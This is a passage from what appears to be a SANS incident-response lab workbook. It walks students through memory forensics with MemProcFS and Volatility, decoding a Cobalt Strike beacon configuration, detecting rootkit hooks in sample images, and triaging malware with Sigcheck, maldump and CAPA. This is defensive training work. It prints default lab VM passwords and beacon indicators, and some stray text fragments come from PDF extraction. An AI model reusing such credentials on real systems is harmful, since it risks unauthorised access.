\forensic\csv\net.csv ﬁle. Notice how this is yet another way you could have discovered some of the malware. Have fun!

Lab Takeaways
• Volatility malﬁnd identiﬁed likely code injection present in the critical LSASS process, PID 692. Injection into this process is
typically related to credential theft since it holds many critical items like NTLM hashes, Kerberos tickets, and DPAPI encryption
keys.
• MemProcFS FindEvil identiﬁed likely code injection present in even more processes:
• lsass.exe (PID 692)
• STUN.exe (PID 1912)

© 2023 SANS Institute

.

65

• msedge.exe (PID 2524)
• explorer.exe (PID 6664)
• MemProcFS YARA detection identiﬁed all the processes above as related to Cobalt Strike malware, including the use of
advanced capabilities like the reﬂective loader and sleep obfuscation.
• MemProcFS is an exciting new memory analysis tool with almost too many features to list. If deep memory analysis is
interesting to you, take some time to read the Wiki documentation, https://for508.com/0aq5z, and plan to spend more time
with this tool.
• Code injection is used precisely because it is challenging to identify. If you felt overwhelmed in this section, you are not alone

.

and will undoubtedly feel more comfortable as you gain more analysis experience.

66

© 2023 SANS Institute

.

Lab 3.4: Memory Extraction and Rootkits
Objectives
1. Extract processes, drivers, and ﬁles from memory to analyze with external tools
2. Take advantage of memory resident ﬁles to perform registry, ﬁle system, persistence, and forensic timeline analysis
3. Find and review cached ﬁles in memory
4. Practice memory-based rootkit detection and malware extraction

Lab Preparation
This lab will be completed in both your 508 SIFT LINUX VM a nd your 508 Windows VM. Please follow the instructions closely.

Lab Questions
Extracting Processes, Drivers, and Objects with MemProcFS
This part of the lab will use the 508 Windows VM
Launch the 508 Windows VM and log in. You can suspend any other VMs to save system resources.
• LOGIN = SANSDFIR
• PASSWORD = forensics

.

Open an administrator command terminal, change directory to G:\SRL_Evidence\memory , and perform a directory listing
cd /d G:\SRL_Evidence\memory

dir /B

Start MemProcFS analysis of rd01-memory.img if you have not already done so (the value after "-forensic" is the number one):
MemProcFS.exe -forensic 1 -device rd01-memory.img -license-accept-elastic-license-2.0

© 2023 SANS Institute

.

67

.

Minimize (do not exit) the command terminal and transition to the M:\ drive within Windows File Explorer

Extraction and Analysis
MemProcFS provides a radically different way of looking at memory. Unlike older memory analysis tools, its abstraction of
memory objects into ﬁles makes extraction effortless. This facilitates a wide range of investigative techniques that can greatly
speed up memory forensics. In this part of the exercise we will explore some of its more unique capabilities.
1. At this point in our investigation, we would likely want to extract some of the suspected malicious processes for further
analysis.
• To extract ﬁles for the STUN.exe process, navigate to M:\name\STUN.exe-1912 . This folder contains all objects tied to that
process.

68

© 2023 SANS Institute

.

.

• The process executable is useful for reverse engineering and signature scanning. Find and copy the representative ﬁle for
STUN.exe to your G:\Labs\memory folder:
M:\name\STUN.exe-1912\files\modules\STUN.exe

Example

© 2023 SANS Institute

.

69

Tip
A good best practice is to rename malicious executables to prevent accidental execution. Once copied, rename this
ﬁle to: STUN_exe_memory (no extension).

• Process memory includes code and data, including the stack, heap, executable, and loaded DLLs. This is useful for data
recovery and behaviorial analysis. MemProcFS packages this into the minidump format to make it ready for debugging.
Copy this ﬁle to your G:\Labs\memory folder:
M:\name\STUN.exe-1912\minidump\minidump.dmp

Example

• Drivers can be extracted from the SYSTEM process, which is responsible for kernel code. Find and copy M:
\name\System-4\files\modules\Mnemosyne.sys to G:\Labs\memory . You might remember this driver showing up in a

previous lab and hopefully noticed it in the MemProcFS FindEvil output (it is a legitimate part of the the F-Response

.

security tool used by SRL, but located in a strange folder):

Example

70

© 2023 SANS Institute

.

2. Memory objects represented as ﬁles make it easy to extract ﬁles and use external analysis tools to gain further insight. A
great example we can demonstrate here is using the tool "1768.py" by Didier Stevens. This tool searches for the presence of
Cobalt Strike beacon conﬁgurations and attempts to decode them, providing the parameters set by the attacker for their
backdoor(s). These can be useful indicators of compromise since there are usually multiple beacons running in a network
and they can share the same conﬁguration choices. 1768.py can scan a process executable, a minidump ﬁle, or even an
entire memory image looking for conﬁguration data.
• Open a command terminal and run the following command against your newly extracted process memory (minidump)
for STUN.exe:
C:\Python310\python.exe c:\Forensic_Program_Files\1768\1768.py -x G:\Labs\memory\minidump.dmp

Tip
Cobalt Strike beacon conﬁgurations are typically obfuscated using a simple XOR key. The -x option in this command will
iterate through all single-digit XOR keys in case the default has been changed. If successful, you should see many misses
followed by an obvious "hit"

• Does it appear that a Cobalt Strike beacon is present?
Solution
Yes. The extraction of a fully formed Cobalt Strike beacon conﬁguration from STUN.exe process memory proves it is
present on this system.
• What is the Payload Type for the beacon? If you like, do some online research to see if you can determine what types of

.

artifacts this should leave behind.
Solution
• windows-beacon_smb-bind_pipz
• This is a very common (and effective) Cobalt Strike beacon type using named pipes over the SMB protocol. While
very effective internally, SMB traﬃc typically isn't allowed external to most networks. This tells us there is likely at
least one other beacon in the network operating as the primary "external facing" command and control presence
for the attackers.

• What processes are used for spawning 32-bit and 64-bit sacriﬁcial processes? Have we seen any of these in use?

© 2023 SANS Institute

.

71

Solution
• C:\Program Files\Internet Explorer\iexplore.exe (32-bit payloads)
• C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe (64-bit)
• These are very sneaky names that can blend in on a lot of systems! However, no matter what executable name is
chosen, having them present in large numbers with unusual parents and unusual permissions usually makes
them obvious (as we previously discovered with the msedge.exe processes).

• What is the default named pipe for this beacon?
Solution
• \\.\pipe\ShellEx_16293
• This should also look familiar (and hopefully is present in your IR Spreadsheet)! We found this earlier as a handle
present in STUN.exe.

.

Tip
We pointed 1768.py at an extracted ﬁle, but we can also parse MemProcFS objects directly. For example, run the following
command on the suspicious msedge.exe process memory ﬁle and try to ﬁgure out what it is reporting. Cobalt Strike is
well documented online so take it as homework to perform some online research on this or other conﬁguration
parameters you are curious about.
C:\Python310\python.exe c:\Forensic_Program_Files\1768\1768.py M:
\name\msedge.exe-2524\minidump\minidump.dmp

Memory-Resident File Investigations
1. MemProcFS has the ability to identify and extract Windows registry data from memory images. The Windows registry is
constantly in use and hence is largely memory resident. MemProcFS extracts available data and virtualizes it into a folder
structure.
• Navigate to the M:\registry\HKU\tdungan\Software\Microsoft\Windows\CurrentVersion\Run key. This is an extremely
common persistence location. From where does the slack.exe application open upon user logon?
________________________________________________________________

72

© 2023 SANS Institute

.

Solution

.

C:\Users\tdungan\AppData\Local\slack\slack.exe

• To demonstrate the power of this capability and explore it further, review the RecentDocs registry key to identify what .zip
ﬁles have recently been opened by the tdungan user (each .txt ﬁle contains the contents of a registry value):

M:

\registry\HKU\tdungan\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs

© 2023 SANS Institute

.

73

Solution
• StarFury.zip
• SRL Logo.zip
• q-balls-v3.py.zip
• 2212.12372.zip

.

• 2212.12372.gz.zip

2. One of the more interesting MemProcFS forensic features is the ability to recover the NTFS Master File Table (MFT) from
memory and use it to build a navigable ﬁle structure. This can be very helpful if you need to check the contents of a speciﬁc
folder. Note that while the ﬁles present in the M:\forensic\ntfs folders look as if they are the original ﬁles, they are largely
just representations with no real ﬁle data available. One exception is NTFS resident ﬁles which are typically very small (less
than ~700 bytes) and stored directly in the MFT (the size limitations should explain why they are quite rare). However, even
without access to ﬁle contents this can be a tremendous resource for forensic examinations. This information (including
original timestamps and ﬁle size) is also presented in a timeline format we will see later in this lab.
• Find the M:\forensic\ntfs folder and navigate to M:\forensic\ntfs\_\Windows\Update . What else do you see in this
folder structure which could be related to previously identiﬁed malware?
________________________________________________________________

74

© 2023 SANS Institute

.

Solution
The ﬁle EdgeUpdater.cfg has been previously identiﬁed and is likely related to the EdgeUpdater.exe application found
to be part of the attacker's toolkit.

• Now navigate to M:\forensic\ntfs\_\Users\tdungan\Documents\SRL-Eyes-Only . While the ﬁle contents in these folders
are not available, getting glimpse of what was present in a user's folders could be interesting for many investigations. In
our case, this could be useful for damage assessment purposes.

hi

de

01

.ir

Solution

• Switch to audit the downloads folder for the likely compromised account, wacsvc:

M:

\forensic\ntfs\_\Users\wacsvc\Downloads . What ﬁles are present which could be interesting to our investigation?

© 2023 SANS Institute

.

75

Solution
• bhv.cfg (similar to the ﬁle found in Windows\Update)
• px.exe (an executable name we have not seen before)

3. Windows performs many ﬁle caching operations in memory. The M:\forensic\files component of MemProcFS identiﬁes
available File_Object data structures resident in memory and attempts to reconstruct the ﬁles from their cached locations.
Unlike the ntfs capability, if a ﬁle appears in this folder, its contents are generally available.
• The files.txt ﬁle contains a list of all identiﬁed cached ﬁles. Open the ﬁle and perform a search for .docx to see if any
Microsoft Word Documents are present in cached form.
• Find and attempt to open any ﬁles found above by traversing the folders in M:\forensic\files\ROOT\ . Note: LibreOﬃce
(installed in the VM) will likely fail to open the .docx ﬁle, but if you have Microsoft Oﬃce available on your host, copy it

.

there and you should be successful at recovering the ﬁle (it is not important to our investigation to see the contents).

76

© 2023 SANS Institute

.

Solution

The ﬁle can be found here: M:\forensic\ﬁles\ROOT\Users\tdungan\Desktop\ffffb50c4e86c1b0-New Years Resolutions
2023.docx
• Open a command terminal and attempt to parse one of the Prefetch ﬁles present in

M:

.

\forensic\files\ROOT\Windows\prefetch (tab-completion can help here):

pecmd -f M:\forensic\files\ROOT\Windows\prefetch\ffffb50c4f38bca0-CMD.EXE-89305D47.pf

© 2023 SANS Institute

.

77

Solution

• Open the PowerShell Transcript resident for the tdungan user (double-click to open in a viewer):

M:

\forensic\files\ROOT\Users\tdungan\Documents\20230125\ffffb50c50985630-PowerShell_transcript.RD01.2vQx+75A.
20230125095722.txt

.

Solution

4. MemProcFS includes several specialized parsers which collect forensic artifacts from memory, including commonly abused
items like Windows Services ( services.csv ) and Scheduled Tasks ( tasks.csv ).
We previously discovered an interesting scheduled task on this system. Open M:\forensic\csv\tasks.csv in Timeline
Explorer. When was the task for STUN.exe created? When was it last executed?
________________________________________________________________
________________________________________________________________

78

© 2023 SANS Institute

.

Solution
• Task SRL Update Service was created on 2023-01-17 15:48:01 and last executed STUN.exe on 2023-01-25 14:38:30.
• Notice that there would be many ways to analyze the available Scheduled Task data for anomalies, including task
name, command line, task creation times, and user privileges.

5. Many artifacts are presented in a timeline view by MemProcFS. Open the ﬁle M:\forensic\csv\timeline_all.csv in Timeline
Explorer. This ﬁle aggregates all the other timelines, merging both ﬁle information (extracted from in-memory MFT artifacts)
and memory-only artifacts like process creation and network connection times. It can be quite large, so be patient while it
loads.
• Perform a global ﬁlter for stun across the timeline. What data sources have information available for that executable?
________________________________________________________________
________________________________________________________________
________________________________________________________________

Solution

.

________________________________________________________________

• Process (PROC)
• File System / MFT (NTFS)
• Scheduled Task (ShTask)
• Registry (REG)

© 2023 SANS Institute

.

79

• When was

STUN.exe

ﬁrst seen on the system? Does that seem like a valid date?

________________________________________________________________
Solution
• The NTFS (MFT) creation time (CRE) for STUN.exe is reported as 2021-06-05 12:05:12
• For this timestamp to be correct, it would indicate an intrusion into SRL dating back almost two years. Before
sounding the alarm that this intrusion is much bigger than we thought, we will need to look deeper into that
timestamp to make sure it is valid (we will do this in a future lab).

6. O ptional Homework: The MemProcFS csv folder houses a forensic goldmine of information all in one location. Since all of
the data sources are represented as text-based CSV ﬁles, it makes an ideal spot to perform searches.
• Open a PowerShell window and change directory to M:\forensic\csv . An easy way to accomplish this from Windows

.

File Explorer is to navigate to the folder within the GUI and then type powershell into the TypedPaths bar. This should
open a PowerShell terminal in that location:

80

© 2023 SANS Institute

.

• In the PowerShell terminal, search for any hits for the SRLUpdate.exe ﬁle that Microsoft Defender removed (discovered in a
previous lab):
Select-String "SRLUpdate" *

What ﬁles return hits?
________________________________________________________________
________________________________________________________________
Solution
• timeline_all.csv
• timeline_registry.csv
• It looks like the only hit was for a registry key. Remember that any of these CSV ﬁles are available for review with
just a double-click in File Explorer! Looking for activities which happened around our ﬁndings can help us better

.

understand actions that occurred.

• Now use PowerShell to search for a previously discovered indicator, EdgeUpdater.exe :
Select-String "EdgeUpdater.exe" *

What ﬁles return hits?
________________________________________________________________
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

81

Solution
• timeline_all.csv
• timeline_registry.csv
• timeline_ntfs.csv
• There are multiple hits for ﬁles with this name in the NTFS (MFT) timeline and one hit within the registry timeline

.

(timeline_all.csv aggregates these hits).

Optional Homework: Rootkit Practice with Volatility
Rootkits are quite rare these days as Microsoft has made impressive gains in closing many of the doors taken advantage of by
rootkit techniques, pushing rootkits out of the kernel and deeper into the stack of hypervisor bootkits and ultimately ﬁrmware.
However, what is old often becomes new again, and you need to learn to walk before you can run. Gaining experience with some
of the classic rootkit detection mechanisms can prepare you in the future to identify similar techniques. Think of this section as
"studying the classics."
We will be using exemplar samples within the example-memory-images folder of your Linux SIFT workstation. This lab is designed
in the style of "choose your own adventure" and aims to provide many different opportunities for memory analysis practice. Feel
free to jump around to areas most interesting to you.

82

© 2023 SANS Institute

.

Launch the 5 08 SIFT LINUX VM and log in. You can suspend any other VMs to save system resources.
• LOGIN = sansforensics
• PASSWORD = forensics
Elevate privileges, change directory to the /cases/example-memory-images folder, and verify that memory images are present.
Notice the samples are in zip format.
sudo su

cd /cases/example-memory-images

ls

Black Energy 2 Rootkit Analysis
Overview: The Black Energy trojan is one of the earliest known examples of cyber-warfare used in conjunction with kinetic warfare.
Its use dates to late 2008 when it was originally employed by Russia for DDOS purposes during the Russia-Georgia conﬂict. An
updated version, Black Energy 2, included a rootkit for stealth and was used during the Russian invasion of the Crimean Peninsula
(Ukraine) in 2014. This is the version we will be looking at here. It provides a good test piece to analyze output from some of the

.

more complicated Volatility plugins. Once you are done looking at this memory image, make a note to read the excellent analysis
published by Secureworks: https://for508.com/wxv2p

Recall that Volatility 3 has not achieved parity with Volatility 2 on rootkit detection so we will be using version 2 (vol2.py in the
SIFT workstation).
• Run the malﬁnd plugin on the black_energy.vmem image to search for injected memory pages.
unzip black_energy.zip

mkdir malfind-output

vol2.py -f black_energy.vmem malfind --profile=WinXPSP2x86 --dump-dir=./malfind-output > be_malfind.txt

less be_malfind.txt

© 2023 SANS Institute

.

83

Tip
You are using the less tool to review the contents of be_malﬁnd.txt. When you want to exit the viewer, type the letter "q".

• Which process shows the highest likelihood of code injection? (Include name, PID, and Address.)
________________________________________________________________
Solution

The svchost.exe process with PID 856 and section address 0xc30000 is the most likely candidate for injection due to it
containing a legitimate PE32 portable executable header ("MZx90x00"). The disassembly snippets from other processes
do not appear to represent legitimate code.
• Review your malﬁnd-output dump directory and ﬁnd the output ﬁle that relates to the injected memory section. (Hint: The
ﬁlename contains the section memory address displayed in the be_malﬁnd.txt output.)
cd /cases/example-memory-images/malfind-output

.

________________________________________________________________
Solution
The name of the output ﬁle is: process.0x80ff88d8.0xc30000.dmp
• Run the ﬁle command against the memory sections identiﬁed by malﬁnd to identify the ﬁle type. Find the ﬁle that has a
portable executable/MZ header ("PE32 executable") and run strings on it to look for any suspicious strings in the code. What
interesting full ﬁlename path is referenced in the strings output?
file *

strings -a process.0x80ff88d8.0xc30000.dmp | less

________________________________________________________________

84

© 2023 SANS Institute

.

Solution

The ﬁlename C:\WINDOWS\system32\drivers\str.sys is an interesting ﬁnd in the strings output. (It turns out to be an
encrypted database used to store malware plugins for Black Energy.) There are several other interesting strings worth
ﬁnding.

• Start your rootkit analysis by running the ssdt plugin; remember to ﬁlter out legitimate SSDT entries by directing your results

.

to egrep -v '(ntoskrnl|win32k)' . How many functions were hooked and by what module?
cd /cases/example-memory-images

vol2.py -f black_energy.vmem --profile=WinXPSP2x86 ssdt | egrep -v '(ntoskrnl|win32k)'

________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

85

Solution
Fourteen functions were hooked by module (driver) named 00004A2A. Note that it also appears there was a duplicate

.

copy of the SSDT[0] table which is also a known rootkit technique.

• Use the modules (or modscan) plugin to better identify the hooking driver found in the ssdt output (try using
the module name identiﬁed in the last step). Write down the base address for future extraction.
vol2.py -f black_energy.vmem --profile=WinXPSP2x86 modules

________________________________________________________________

86

© 2023 SANS Institute

.

grep to ﬁlter for

Solution

• The base address of module 00004A2A is 0xff0d1000.
• Another way this might have been discovered is just seeing a very strangely named driver in the loaded drivers list!
• Extract the malicious driver from the black_energy.vmem image.
mkdir moddump-output

vol2.py -f black_energy.vmem --profile=WinXPSP2x86 moddump -b 0xff0d1000 --dump-dir=./moddump-output

cd ./moddump-output

file *

If you like, submit the extracted driver to VirusTotal or your favorite analysis site to conﬁrm your ﬁndings. Note: Antivirus

.

engines often have diﬃculty identifying static malware samples and thus often will use a generic hit descriptor.

© 2023 SANS Institute

.

87

.

Solution

APT Malware Detection
Now let's use what we learned to detect a rootkit employed by custom APT malware.
• Search for any SSDT hooks.
cd /cases/example-memory-images

unzip APT.zip

88

© 2023 SANS Institute

.

vol2.py -f APT.img --profile=WinXPSP3x86 ssdt | egrep -v '(ntos|win32k)'

• What suspicious driver is present?
________________________________________________________________
Solution
irykmmww.sys

• This is a fun (and challenging) memory image to review. When you want more practice, run through the entire six-step
process with this image looking for two bad processes, one bad DLL, and one bad rootkit driver (which you just found).
APT Memory Image Full Solution
The solution to this optional challenge is in the accompanying ﬁle APT-ANSWERS.pdf, also available in the Bonus Labs
folder at for508.com/dropbox-distance. Note that the answers in this document use Volatility version 2. Volatility version
2 is aliased to vol2.py in your virtual machine, so your command lines will not match perfectly with the document. As an

.

extra challenge, you can use your class materials to map the commands to the equivalent Volatility 3 command lines.

Storm Worm Rootkit
The Storm Worm exhibits classic rootkit behavior and is a great place to get familiar with rootkit detection capabilities. Start with
SSDT hooks. Remember we are looking for Hooking Modules pointing outside of the standard Windows kernel ﬁles ntoskrnl.exe
and win32k.sys.
cd /cases/example-memory-images

unzip storm_worm.zip

vol2.py -f storm_worm.img --profile=WinXPSP3x86 ssdt | egrep -v '(ntos|win32k)'

• What suspicious driver is present?
________________________________________________________________

© 2023 SANS Institute

.

89

Solution
burito24b1-1710.sys
• What functions were hooked?
________________________________________________________________
________________________________________________________________
________________________________________________________________
Solution
• NtEnumerateKey
• NtEnumerateValueKey
• NtQueryDirectoryFile

• This is another simple and fun memory image to keep analyzing. See if you can ﬁnd and extract the malicious driver. Use
techniques similar to those in the previous examples to ﬁnd two malicious processes and maybe even some interesting

.

network connections.
IAT and inline hook detection
• The apihooks plugin can take hours to complete, so we have already executed it and output the results into a text ﬁle. Review
the apihooks plugin output from the Zeus image in your example memory images folder: /cases/example-memory-images . In
particular, you should be looking for output like "Hooking module: <unknown>." This means that the code "detour" is not
pointing to a known loaded library and is often an indication of something suspicious.
cd /cases/example-memory-images

gedit zeus-apihooks.txt

90

© 2023 SANS Institute

.

Solution

• Using the zeus-apihooks.txt output, build a grep command to determine how many functions were hooked on this system.
(Hint: Results can be piped to wc -l (word count by line) for a total count)
________________________________________________________________
Solution
The command grep -i unknown zeus-apihooks.txt | wc -l will provide a rough count of the number of entries that
include "unknown". The -l in the commannd is a lowercase "L".
There were 347 Inline and IAT hooks identiﬁed in the Zeus memory image with <unknown> as the hooking module.

Lab Takeaways
• MemProcFS introduces interesting new capabilities to memory analysis. The ability to easily traverse the Windows registry
and ﬁle system solely from memory data is incredibly useful. Here (and in the previous code injection exercise) we used

.

extraction features of MemProcFS to quickly analyze process executables and memory sections. These capabilities are
particularly useful when a disk image is not available, or when ﬁles on disk have been destroyed or encrypted.
• The identiﬁcation of a Cobalt Strike beacon conﬁguration in STUN.exe provided useful indicators of compromise to look for
on other SRL systems:
• P ayload Type: windows-beacon_smb-bind_pipz
• Sacriﬁcial Process (32-bit): C:\Program Files\Internet Explorer\iexplore.exe
• S acriﬁcial Process (64-bit):C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
• D efault Pipe Name: \.\pipe\ShellEx_16293
• Analysis of the in-memory Master File Table (MFT) provided additional information on multiple ﬁles:
• C:\Windows\Update\EdgeUpdater.cfg
• C:\Users\wacsvc\Downloads\bhv.cfg
• C:\Users\wacsvc\Downloads\px.exe
• The NTFS creation time for STUN.exe was recorded as 2021-06-05 12:05:12, which would indicate the intrusion has been
ongoing for over two years. This needs to be investigated.

© 2023 SANS Institute

.

91

• In the optional rootkit section we saw that ﬁnding hooks in an easy location like the system call (SSDT) table can sometimes
lead to identifying additional, harder to ﬁnd malicious hooks and loaded drivers.
• Code injection and rootkits are often employed together by advanced malware. This is not always the case, but if you ﬁnd

.

evidence of one, you should look closer for evidence of the other.

92

© 2023 SANS Institute

.

Lab 4.1: Malware Discovery
Objectives
1. Identify suspicious binaries via digital signatures and the presence of packing and compilation anomalies.
2. Learn to analyze Sigcheck results to ﬁnd suspicious ﬁles.
3. Extract and analyze anti-virus quarantine ﬁles.
4. Leverage the power of CAPA to perform executable analysis.
5. Use YARA for signature detection.

Lab Preparation
This lab is completed in your 508 Windows VM
1. Launch the 508 Windows VM and log in.
• LOGIN = SANSDFIR
• PASSWORD = forensics
2. Please ensure your evidence is mounted correctly at rd01-triage(E:)

.

G:\SRL_Evidence\triage

If you do not see your evidence mounted, use Windows Explorer to browse to

and double-click on

the ﬁle rd01-triage.vhdx . The image will automatically mount in your 508 Windows VM using the next available drive letter
(likely E: ). If your image does not mount as drive letter E: , you likely have another device (often USB) attached to your virtual
machine. Consider ﬁxing this, rebooting, and trying again. This lab assumes the triage image is mounted as E: .

© 2023 SANS Institute

.

93

Lab Questions
Identify Suspicious Executables with Sigcheck
1. We will employ the Sigcheck tool to identify potentially suspicious executables worth examining more closely. However, before
running Sigcheck on our triage evidence, we must take a few steps to import the suspect system's digital signature catalog
ﬁles into the cryptographic database of our analysis virtual machine. Without this process, Sigcheck will be unable to verify the
"catalog" signed ﬁles (Microsoft uses two primary types of digital signatures: catalog and authenticode, with catalog signed
ﬁles being most common). Follow these steps to import the catalog signature ﬁles:
a. Copy the collected CatRoot folder (named as a GUID) from the triage image location E:\C\Windows\System32\CatRoot to

.

folder G:\Labs\malware :

b. We need any copied directories to have new names (although still in a GUID format) so they do not conﬂict with any
existing directories in our own VM's CatRoot directory. In G:\Labs\malware , right-click each directory (there is only one in this
example), choose Rename, and change the last value from an E to the arbitrary value 9 (the copied directory should now end
with the value "-00C04FC295E9}")

94

© 2023 SANS Institute

.

c. Now copy the renamed folder from G:\Labs\malware to C:\Windows\System32\CatRoot . If prompted by UAC to provide
administrator permissions, click Continue. After the copy, there should be three similarly named directories in

C:

.

\Windows\System32\CatRoot :

d. Right-click the Start Menu and choose Run (or use WINDOWS KEY + R). Then type "services.msc" and OK. In the Services
window that appears, ﬁnd Cryptographic Services and click Restart to import the new catalog information into our VM.

© 2023 SANS Institute

.

95

.
e. Open an administrator command terminal and type the following to execute Sigcheck against all executable ﬁles present in
the triage image:
sigcheck -a -c -e -h -s -w G:\labs\malware\sigcheck-results.csv E:\C

96

© 2023 SANS Institute

.

Important
The above command can take several minutes to complete. To save time, we will have you open the precooked version in
the next step.

2. Using Timeline Explorer, open the precooked version of the output ﬁle found in

G:\precooked\malware\sigcheck-results.csv

.

.

3. Start your analysis by ﬁltering for unsigned binaries. Filter the Veriﬁed column to only show unveriﬁed items (unchecked).
(Note: if Timeline Explorer fails to ﬁnd the proper layout ﬁle, it could display signed/unsigned instead of the checkboxes in this
column.)

What are the top three ﬁles you would prioritize investigating further within this output? What ﬁle metadata makes these ﬁles
more unusual than the others?
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

97

________________________________________________________________
Hint
Sorting by ﬁle entropy can help narrow the ﬁeld.
Solution
• e:\c\Windows\System32\STUN.exe
• e:\c\Users\tdungan\Downloads\HiPERCalc.exe
• e:\c\Users\tdungan\Downloads\7z2201-x64.exe
• We previously identiﬁed STUN.exe, making it an easy choice. It is also missing most metadata, which is highly
unusual for binaries present in the System32 folder.
• HiPERCalc.exe and 7z2201-x64.exe also have missing or unexpected ﬁle metadata. They are both 32-bit applications,
which are less common on modern systems, and they have very high ﬁle entropy (remember that the maximum

.

entropy value is 8).

4. Review the Windows Portable Executable (PE) Compilation Times (Timestamp column) for the ﬁles identiﬁed in the last
question. Do any provide information that could be useful to our investigation?
________________________________________________________________
________________________________________________________________

98

© 2023 SANS Institute

.

Solution
• The compilation time for for STUN.exe, 2023-01-13 19:39:00, is interesting in that it is in the general time range of
other attacker activity found in our investigation. This could indicate this malware was custom compiled for this
attack (as opposed to using an older off-the-shelf payload).
• Notice that many of the Microsoft ﬁles have nonsensical compilation times. This is unfortunately common and serves
as a reminder that this artifact can be unreliable. Compilation times can be modiﬁed by attackers, but this happens
less often than you might imagine.

5. Create a new ﬁlter to look for Veriﬁed (signed) binaries from untrusted or unknown sources. To do this, selected Veriﬁed in
that column and then ﬁlter out all Publisher organizations you trust. In this example, remove any items digitally signed by

.

Microsoft, Skype, Slack, and VMware.

• What ﬁles present in this list look particularly relevant to our investigation?
• Are there any new attacker tools identiﬁed here?
• What extra information does the metadata for these applications give us?
________________________________________________________________

© 2023 SANS Institute

.

99

________________________________________________________________
________________________________________________________________
Solution
• e:\c\Users\wacsvc\Downloads\ph.exe
• e:\c\Windows\Update\EdgeUpdater.exe
• We have not yet documented ph.exe as a likely part of the attacker toolkit. The embedded metadata within the
portable executable header indicates it could be the Process Hacker application and EdgeUpdater.exe the Nirsoft
Web Browser History Viewer.

• How could you verify whether the metadata for these ﬁles is legitimate?
Solution
One of the easiest ways to get more information about these ﬁles is to perform Internet and/or VirusTotal searches
using the ﬁle hashes.
6. Execute Sigcheck against single ﬁles adding the VirusTotal options. To do this, open or go back to the original administrator

.

command terminal and run the following command on ph.exe:
sigcheck -a -h -v -vt e:\c\Users\wacsvc\Downloads\ph.exe

How many security vendors ﬂagged this binary as malicious (VT detection value)?
________________________________________________________________

100

© 2023 SANS Institute

.

Solution
At the time of publication, 30 security vendors identiﬁed this binary as malicious. However, these numbers ﬂuctuate with

.

time so you may currently see a different value.

© 2023 SANS Institute

.

101

Note
While Virus Total (VT) lookups can be included when running Sigcheck in CSV mode (by adding -v -vt to the overall
command-line), the maximum allowed number of lookups is usually exceeded when evaluating thousands of ﬁles without
a purchased API key. Hence we opted here to look up VT information only on items of particular interest.

Perform the same action for EdgeUpdater.exe.
sigcheck -a -h -v -vt e:\c\Windows\Update\EdgeUpdater.exe

.

Solution

102

© 2023 SANS Institute

.

BONUS: What does VirusTotal output look like if you are the FIRST to discover malware that no one has ever seen before?
Solution
It is unlikely you can replicate this view as by the time you take the class, it is very likely someone will have submitted a
sample of STUN.exe to VirusTotal (VT). However, it is important to understand the signiﬁcance of a VT "Unknown"
response. Unknown means a ﬁle with that hash has never been seen by VirusTotal. With more than one million
submissions per day, including almost every Microsoft ﬁle in existence, it is very unusual to get an "Unknown" result for a
legitimate ﬁle. Especially a ﬁle located in the C:\Windows\System32 folder (imagine how many people are submitting this

.

folder for analysis around the world). This ﬁnding alone would be a good reason to look deeper at STUN.exe!

© 2023 SANS Institute

.

103

Anti-Virus Quarantine Extraction
Finding and extracting anti-virus quarantine ﬁles can be surprisingly challenging, depending on the vendor. Luckily there is a great
open-source project, maldump, that can automate the process for several well-known products, including Windows Defender. In a
previous lab we documented Windows Defender logs indicating activity on RD01. Here we will attempt to recover any quarantined
ﬁles for analysis.
1. Change directory to G:\Labs\malware and run the following maldump -l command to identify any available quarantined ﬁles
(the parameter is a lowercase "L"). What types of ﬁles are currently in the quarantine?
cd /d G:\Labs\malware

maldump -l e:\C

________________________________________________________________
________________________________________________________________
Solution
A scheduled task ﬁle and an executable are present in the Windows Defender quarantine on RD01
• C:\Windows\System32\Tasks\SRL User Maintenance

.

• C:\Windows\System32\SRLUpdate.exe

2. Attempt quarantine extraction for these ﬁles using maldump -a:
maldump -a e:\C

3. Use Timeline Explorer to open the metadata output ﬁle for the quarantined items, G:\Labs\malware\quarantine.csv . Answer
the following questions:
When did the ﬁles get quarantined by Windows Defender?
________________________________________________________________
What threat was identiﬁed for these ﬁles?
________________________________________________________________

104

© 2023 SANS Institute

.

Solution
• Quarantine time: 2023-01-25 00:41:57
• Threat: Win32/CobaltStrike.E!sms

.

• You should recall seeing similar information in the Windows Defender Event Logs:

4. Right-click on G:\Labs\malware\quarantine.tar and use 7-Zip -> Extract Here to extract the archive contents. The results will
be written into a folder named G:\Labs\malware\Windows Defender and named according to their MD5 hash (ﬁle name to
hash mapping can be found in the quarantine.csv ﬁle).

© 2023 SANS Institute

.

105

Open the task scheduler ﬁle, ce419071cc52d67900303ab1023e2e1a , in Notepad++. What was the trigger event for this
scheduled task and when was it scheduled to be active? How long was it active before being discovered by Windows
Defender?
________________________________________________________________
________________________________________________________________
________________________________________________________________
Solution
• LogonTrigger (execution at user logon)
• 2023-01-17T10:51:00 (local system time)
• Given the quarantine time identiﬁed in the last question, this means the task could have been active for over a week

.

before it was detected.

What account was used to create this scheduled task? Under what account context will the malware run? (Hint: Be careful
with your answer!)
________________________________________________________________
________________________________________________________________

106

© 2023 SANS Institute

.

Solution
• The wacsvc account was used to create the scheduled task.
• The task was setup to execute using user tdungan's credentials at each user logon after 2023-01-17 10:51 local
system time.

Note

Analyze Executables with CAPA

.

We will analyze the quarantined executable in the next section.

In the previous sections, we reduced our data set to a small number of suspicious ﬁles. Now we can use the open-source CAPA
tool to gain a bit more insight into the ﬁles before making a ﬁnal decision to send them to a sandbox or to be reverse engineered.
1. In a command terminal, execute CAPA against the quarantined executable extracted in the last section. Document a few of
the most dangerous capabilities this sample possesses.
capa "G:\Labs\malware\Microsoft Defender\05a869122d60fd27718d2d7773b10050"

________________________________________________________________
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

107

Solution
Interpreting CAPA output can be subjective and is dependent on what you are looking for and your experience with
previous malware samples (running CAPA against many known-good and bad samples is excellent practice!) It is
important to note that CAPA is simply enumerating the capabilities of an executable, so nearly every executable will have
some features identiﬁed. The trick is to recognize what features are most likely associated with malware. As an example,
the "Writes File" and "Create Thread" capabilities identiﬁed in this sample are also found in a wide-range of legitimate
executables. What we are looking for are capabilities likely to be abused by advanced malware. In this sample there are a
few of these dangerous characteristics. Hopefully you are more familiar with many of these after completion of the
